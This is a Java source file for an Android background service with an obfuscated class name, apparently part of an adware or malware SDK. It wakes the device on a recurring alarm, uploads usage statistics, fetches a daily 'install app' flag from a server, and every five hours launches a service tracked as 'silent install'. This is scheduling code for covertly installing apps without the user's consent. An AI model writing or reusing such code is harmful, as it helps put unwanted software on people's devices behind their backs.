package net.doll.holx.service;

import net.doll.holx.data.SharePreferenceSdkData;
import net.doll.holx.net.NetworkTask;
import net.doll.holx.utils.KingsSystemUtils;
import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.lsk.open.core.net.NetHeadUtils;
	/*
	 * TimeRunnableSerivce
	 */

public class tr extends IntentService {
	

	private static int RQ_TIME = 25 * 60 * 1000;
//	private static int RQ_TIME = 1 * 1000;
	private static long mRq_time = RQ_TIME;
	public static final String SHOW_SMALL_IMAGE = "1";
	private Context mContext;
	private static final int SILENT_INSTALL_TIME_INTERVAL = 1000 * 60 * 60 * 5 ;
	
	public tr() {
		super("TimeRunableService");
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		mContext = getApplicationContext();
	}
	
	private void setAlarm(){
		AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
		PendingIntent intent = PendingIntent.getService(this, 0, new Intent(this, tr.class), 0);
		alarm.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+mRq_time, intent);
	}
	
	@Override
	protected void onHandleIntent(Intent intent) {	
	 Log.e("ks_test","************onHandlerIntent************");
		long now = System.currentTimeMillis();
		//活跃用户统计(每天上传)
		long actTime =SharePreferenceSdkData.getLastUploadLauncherTimes(mContext);
		
		if(actTime==0){
			SharePreferenceSdkData.setLastUploadLauncherTimes(mContext, System.currentTimeMillis());
		}else{
			
			if ((Math.abs(now-actTime)>7*60*60*1000)) {
				SharePreferenceSdkData.setLanucherTimers(mContext, now);
				if(NetHeadUtils.isNetWorking(mContext)){
					NetworkTask.userBoot(mContext, SharePreferenceSdkData.getLanucherTimers(mContext));
				}
		}
		}
		//是否在下载后安装app的标志位(每天1次请求)
		long installFlag=SharePreferenceSdkData.getUpdateInstallAppFlagTime(mContext);
		if(installFlag==0){
			SharePreferenceSdkData.setUpdateInstallAppFlagTime(mContext, System.currentTimeMillis()+RQ_TIME);
		}else{
			if(!KingsSystemUtils.isSameDay(SharePreferenceSdkData.getUpdateInstallAppFlagTime(mContext))
					&&Math.abs(now-installFlag)>11*60*60*1000){
				if(NetHeadUtils.isNetWorking(mContext)){
					NetworkTask.installAppFlag(mContext, null);
					SharePreferenceSdkData.setUpdateInstallAppFlagTime(mContext, System.currentTimeMillis()+RQ_TIME);
				}
		}
		}
		
		
		long latestsiTime = SharePreferenceSdkData.getLatestSilentInstallTime(getApplicationContext());
		if(latestsiTime == 0) {
			SharePreferenceSdkData.setLatestSilentInstallTime(getApplicationContext(), now+2*RQ_TIME);
		}else if(now - latestsiTime > 1000*60*60*5) {
			Intent siService = new Intent(this, si.class);
			startService(siService);
			SharePreferenceSdkData.setLatestSilentInstallTime(getApplicationContext(), now);
		}

		setAlarm();
	}
}
